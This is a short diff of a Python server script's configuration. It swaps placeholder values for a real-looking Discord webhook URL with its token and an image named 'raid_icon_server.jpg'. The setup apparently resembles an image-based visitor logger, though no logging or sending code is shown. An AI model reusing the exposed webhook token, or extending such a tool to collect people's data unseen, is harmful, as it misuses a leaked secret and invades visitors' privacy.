@@ -9,12 +9,12 @@ import socket
 import threading
 
 # Configuration
-WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'  # Replace with your webhook URL
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1411799672355553405/uU2LsNrcqU_VXvSmygH5FH3TT5saPEWRR_uqg218VlNczy3YpTCTjbObgLmhcQwUIhj2'  # Replace with your webhook URL
 PORT = 8080  # Port to run the server on
 HOST = '0.0.0.0'  # Host to bind to (0.0.0.0 for all interfaces)
 
 # Custom image URL - replace with your image URL
-IMAGE_URL = "https://example.com/your-image.jpg"  # Replace with your image URL
+IMAGE_URL = "https://cdn.discordapp.com/attachments/1411745601233879050/1411799978539749376/raid_icon_server.jpg?ex=68b5f8b0&is=68b4a730&hm=9b714588bf3c45b8d9e3775091f018cebf3efc07f12ce339dcc6a48cd75caf7b"  # Replace with your image URL
 
 # Download the image once at startup
 try:
